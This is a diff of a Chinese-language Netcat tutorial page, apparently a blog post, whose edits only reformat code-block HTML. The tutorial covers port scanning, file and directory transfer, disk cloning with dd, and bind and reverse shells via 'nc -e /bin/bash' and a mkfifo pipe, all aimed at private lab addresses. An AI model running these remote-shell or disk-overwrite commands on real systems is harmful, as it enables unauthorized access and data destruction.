@@ -133,7 +133,8 @@ MathJax.Hub.Config({
 <h3 id="section-1">端口扫描</h3>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -z -v -n 192.168.100.100 21-25</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -z -v -n 192.168.100.100 21-25
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <ul>
   <li>可以运行在TCP或者UDP模式，默认是TCP，-u参数调整为udp.</li>
@@ -145,7 +146,8 @@ MathJax.Hub.Config({
 <p>一旦你发现开放的端口，你可以容易的使用Netcat 连接服务抓取他们的banner。</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -v 192.168.100.100 21</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -v 192.168.100.100 21
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <h4 id="section-2">消息传送</h4>
 
@@ -154,14 +156,16 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -l 1234</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -l 1234
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>Netcat 命令在1567端口启动了一个tcp 服务器，所有的标准输出和输入会输出到该端口。输出和输入都在此shell中展示。</p>
 
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc 192.168.100.100 1234</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc 192.168.100.100 1234
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>不管你在机器B上键入什么都会出现在机器A上</p>
 
@@ -172,12 +176,14 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -l 1234 &lt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -l 1234 &lt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -n 192.168.100.100 1234 &gt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -n 192.168.100.100 1234 &gt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>这里我们创建了一个服务器在A上并且重定向Netcat的输入为文件file.txt，那么当任何成功连接到该端口，Netcat会发送file的文件内容。</p>
 
@@ -190,12 +196,14 @@ MathJax.Hub.Config({
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -l 1234 &gt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -l 1234 &gt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc 192.168.100.101 1234 &lt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc 192.168.100.101 1234 &lt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <h4 id="section-4">目录传输</h4>
 
@@ -206,12 +214,14 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">tar -cvf – dir_name | nc -l 1234</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">tar -cvf – dir_name | nc -l 1234
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -n 192.168.159.100 1234 | tar -xvf -</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -n 192.168.159.100 1234 | tar -xvf -
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>这里在A服务器上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给Netcat，Netcat可以通过网络发送它。</p>
 
@@ -222,13 +232,15 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">tar -cvf – dir_name| bzip2 -z | nc -l 1234</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">tar -cvf – dir_name| bzip2 -z | nc -l 1234
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 <p>通过bzip2压缩</p>
 
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc -n 192.168.100.100 1234 | bzip2 -d |tar -xvf -</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc -n 192.168.100.100 1234 | bzip2 -d |tar -xvf -
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 <p>使用bzip2解压</p>
 
 <h4 id="section-5">加密你通过网络发送的数据</h4>
@@ -238,13 +250,15 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">nc 192.168.100.101 1234 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">nc 192.168.100.101 1234 | mcrypt –flush –bare -F -q -d -m ecb &gt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 <p>使用mcrypt工具加密数据。</p>
 
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1234</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">mcrypt –flush –bare -F -q -m ecb &lt; file.txt | nc -l 1234
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 <p>使用mcrypt工具解密数据。</p>
 
 <p>以上两个命令会提示需要密码，确保两端使用相同的密码。</p>
@@ -260,11 +274,14 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$dd if=/dev/sda | nc -l 1567</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$dd if=/dev/sda | nc -l 1567
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
-<p>SERVER B:
-&lt;div class=&#8217;bogus-wrapper&#8217;&gt;<notextile><figure class="code">&lt;div class=&#8221;highlight&#8221;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#8221;gutter&#8221;&gt;&lt;pre class=&#8221;line-numbers&#8221;&gt;<span class="line-number">1</span>
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#8217;code&#8217;&gt;&lt;pre&gt;<code class=""><span class="line">$nc -n 192.168.100.100 1567 | dd of=/dev/sda</span></code>&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;</figure></notextile>&lt;/div&gt;</p>
+<p>SERVER B:</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc -n 192.168.100.100 1567 | dd of=/dev/sda
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <h4 id="shell">打开一个shell</h4>
 
@@ -275,12 +292,14 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc -l 1567 -e /bin/bash -i</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc -l 1567 -e /bin/bash -i
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>SERVER B:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc 192.168.100.100 1567</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc 192.168.100.100 1567
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>这里我们已经创建了一个Netcat服务器并且表示当它连接成功时执行/bin/bash</p>
 
@@ -289,7 +308,8 @@ MathJax.Hub.Config({
 <p>SERVER A:</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$mkfifo /tmp/tmp_fifo$cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$mkfifo /tmp/tmp_fifo$cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2&gt;&amp;1中。是用来重定向标准错误输出和标准输出，然后管道到Netcat 运行的端口1567上。至此，我们已经把Netcat的输出重定向到fifo文件中。</p>
 
@@ -316,14 +336,16 @@ MathJax.Hub.Config({
 <p>服务端</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc -l 1567</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc -l 1567
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>在客户端，简单地告诉Netcat在连接完成后，执行shell。</p>
 
 <p>客户端</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc 192.168.100.100 -e /bin/bash</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc 192.168.100.100 -e /bin/bash
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>现在，什么是反向shell的特别之处呢</p>
 
@@ -336,12 +358,14 @@ MathJax.Hub.Config({
 <p>服务器端</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc -l 1567</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc -l 1567
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>客户端</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc 172.31.100.7 1567 -p 25</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc 172.31.100.7 1567 -p 25
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>使用1024以内的端口需要root权限。</p>
 
@@ -354,12 +378,14 @@ MathJax.Hub.Config({
 <p>服务器端</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc -u -l 1567 &lt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc -u -l 1567 &lt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>客户端</p>
 
 <div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$nc -u 172.31.100.7 1567 -s 172.31.100.5 &gt; file.txt</span></code></pre></td></tr></table></div></figure></notextile></div>
+</pre></td><td class="code"><pre><code class=""><span class="line">$nc -u 172.31.100.7 1567 -s 172.31.100.5 &gt; file.txt
+</span></code></pre></td></tr></table></div></figure></notextile></div>
 
 <p>该命令将绑定地址172.31.100.5。</p>
 
